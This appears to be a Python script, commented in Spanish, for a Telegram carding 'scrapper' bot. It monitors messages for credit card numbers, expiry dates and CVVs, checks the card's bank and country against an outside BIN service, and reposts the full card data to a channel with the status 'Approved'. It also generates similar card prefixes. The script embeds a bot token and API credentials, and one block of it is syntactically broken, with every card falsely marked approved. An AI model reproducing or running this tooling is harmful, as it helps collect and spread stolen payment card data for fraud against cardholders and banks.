from telethon import TelegramClient, events
import telebot
import re
import time
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 
import requests
import random
Token = "6896553582:AAFfzMtaXsytASs6eW82aJL9AO9E5-zxGHw" #Token de bot, el bot tiene que estar en el canal con todos los permisos de administrador
id_channel = -1002062068679 #aca ya sabes las apis y el id del canal
api_id = 28949197
api_hash = '34d5a2099c3b58576b9e4f50b7da25b1'


client = TelegramClient('anon', api_id, api_hash)
client.parse_mode = 'html'

bot = telebot.TeleBot(Token, parse_mode="html")

def verificar(ccn):
    with open('tarjetas.txt', 'r') as f: r = f.read()
    if ccn in r:
        return True
    else: 
        return False
reply_markup = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton( 
                            "𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮𝘀 Ⓜ",
                            url="https://t.me/+PUf_l7sVBF45NWYx"   
                        ),
                        InlineKeyboardButton( 
                            "𝗣𝗿𝗼𝗷𝗲𝗰𝘁 𝆶",
                            url="https://t.me/GatoOnichan2"  
                        
                        ),        #aca identificas los botones, como los nombraras etc
                    ],
                    [
                        InlineKeyboardButton( 
                            "𝗚𝘂𝗶𝗱𝗲 ☩",
                            url="https://t.me/+t2-IX7twnPgyYTc5"  
                        
                        ),
                    ],
                ]
            )


print("Scrapper Iniciado\n")



@client.on(events.NewMessage)
async def my_event_handler(event):
    text = event.raw_text
    
    if ("|"):
        x = re.findall(r'\d+', text)
        if len(x) == 0:
            print(f'\033[43m\033[30m ! \033[0m Tarjeta no detectada\n')
            
            return
        if len(x) == 1:
            print(f'\033[43m\033[30m ! \033[0m Tarjeta no detectada\n')
            
            return
        elif len(x) == 2:
            print(f'\033[43m\033[30m ! \033[0m Tarjeta imconpleta\n')
            
            return
        elif len(x) == 3:
            print(f'\033[43m\033[30m ! \033[0m Falta el cvv\n')
            
            return
        cc = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if len(cc) > 16:
            return
        if len(mm) > 2:
            return
        if len(yy) > 4:
            return
        if len(cvv) > 4:
            return
        cxc = (f"{cc}")
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(cc) < 15 or len(cc) > 16:
            print(f'\033[43m\033[30m ! \033[0m Invalid card\n')
            return
        if len(yy) == 2:
            yy = '20'+yy
        

        tarj = f'{cc}|{mm}|{yy}|{cvv}'
        v = verificar(cc)
        if v == True:
            print(f'{tarj} Tarjeta ya existe!\n')
            return
        tarj = f'{cc}|{mm}|{yy}|{cvv}'   
        with open('tarjetas.txt', 'a') as d:
            d.write(tarj+"\n")

        if 'Approved' == 'Approved':
            mes = '✅ Approved - ''𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 𝑪𝑪𝑵',
    'Approved',
    'Non VBV',
    '✅✅✅ Approved ✅✅✅', 
    "Approved",
    "Succeeded! 🤑",
    "APPROVED",
    "APPROVED ✅",
    "✅✅✅ Approved ✅✅✅",
    "Approved CCN",                    
    "Approved #AUTH! ✅",
    "Approved ❇️",
    "APPROVED ✅",
    "APPROVED ✓",
    "✅Appr0ved",
    "Security code incorrect✅",
    "Approved ❇️",
    "CVV2 FAILURE POSSIBLE CVV ⌯ N - AVS: G",
    "Succeeded!",
    "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝒂𝒓𝒅 ✅",
    "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅",                   
    "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 𝟎.𝟐𝟓$",  
    "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 $3 ✅",
    "Succeeded",   
    "Error: Your card has insufficient funds.",  
    "Subscription complete",             
    "CVV LIVE ✅",
    "Card Approved CCN/CCV Live",    
    "incorrect_cvc",
    "VIVA ✅",           
    "APPROVED ✓"  +tarj+'' #aca puedes ir agregando otros responses ejemplo, Invalid cvc2, etc.
    bin = cxc[0:6]
    rs = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()
    Response = ["Approved"]
    country = rs["country_name"]
    lag = rs["country_flag"]
    bank = rs["bank"]
    brand = rs["brand"]
    type = rs["type"]
    level = rs["level"]
    extra1 = (random.randrange(1000,9500,3))
    mes1 = (random.choice(("01","02","03","04","05","06","07","09","09","10","11","12")))
    year1 = (random.randint(2024, 2030))
    hola = ["Response"]
    que = cxc[0:2]
    sp = (random.randrange(100,950,3))
    Response=hola
    tiempofinal = time.perf_counter()
    tiempoinicio = time.perf_counter()
    similar_bins = [f"<code>{que}{random.choice('0123456789')}{random.choice('0123456789')}{random.choice('0123456789')}{random.choice('0123456789')}</code>" for _ in range(6)]
#ADVERTENCIA: Si vas a cambiar plantilla avisame, el codigo es bastante delicado, asi que esta mierda no te enciende si colocas mal la plantilla, puede ser que te falte algun signo o <b> y asi-
#tambien puede ser el orden de las palabras, pero si tu le entiedes no hay problema, aun asi insisto, si cambias plantillas avisame
    text = f"""
<b>𝐒𝐂𝐑𝐀𝐏𝐏𝐄𝐑 𝐌6𝐉 [𝗣𝗿𝗲𝗺𝗶𝘂𝗻]</b>
<b><a href="tg://resolve?domain=PrincessScrapper">━━━━━━━━━━━━━━</a></b>
<b><b><a href="tg://resolve?domain=PrincessScrapper">ꔷ</a></b> 𝗖𝗰:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>
<b><b><a href="tg://resolve?domain=PrincessScrapper">ꔷ</a></b> 𝗦𝘁𝗮𝘁𝘂𝘀:</b> <code>Approved!</code>✅
<b><b><a href="tg://resolve?domain=PrincessScrapper">ꔷ</a></b> 𝗕𝗶𝗻</b>: #Bin{bin} 
<b><a href="tg://resolve?domain=PrincessScrapper">━━━━━━━━━━━━━━</a></b>
<b>┬</b>
<b>│<b><a href="tg://resolve?domain=PrincessScrapper">ⓘ</a></b></b><code>{cxc[0:12]}xxxx|{mm}|{yy}|rnd</code>  
<b>│<b><a href="tg://resolve?domain=PrincessScrapper">ⓘ</a></b></b><code>{cxc[:8]}{extra1}xxxx|{mes1}|{year1}|rnd</code>
<b>┴</b>
<b><a href="tg://resolve?domain=PrincessScrapper">━━━━━━━━━━━━━━</a></b>
<b><b><a href="tg://resolve?domain=PrincessScrapper">ꔷ</a></b> 𝗜𝗻𝗳𝗼</b>: <code>{brand}</code> - <code>{level}</code> - <code>{type}</code> 
<b><b><a href="tg://resolve?domain=PrincessScrapper">ꔷ</a></b> 𝗕𝗮𝗻𝗰𝗼</b>: <code>{bank}</code> 
<b><b><a href="tg://resolve?domain=PrincessScrapper">ꔷ</a></b> 𝗣𝗮𝗶𝘀</b>: <code>{country} [{lag}] </code>
<b><a href="tg://resolve?domain=PrincessScrapper">━━━━━━━━━━━━━━</a></b>
"""
    print(f'\033[44m\033[30m $ \033[0m card enviada -> {cc}|{mm}|{yy}|{cvv}\n')
    time.sleep(20)
    
    bot.send_message(id_channel, text,reply_markup=reply_markup,disable_web_page_preview=True)
    pass

client.start()
client.run_until_disconnected()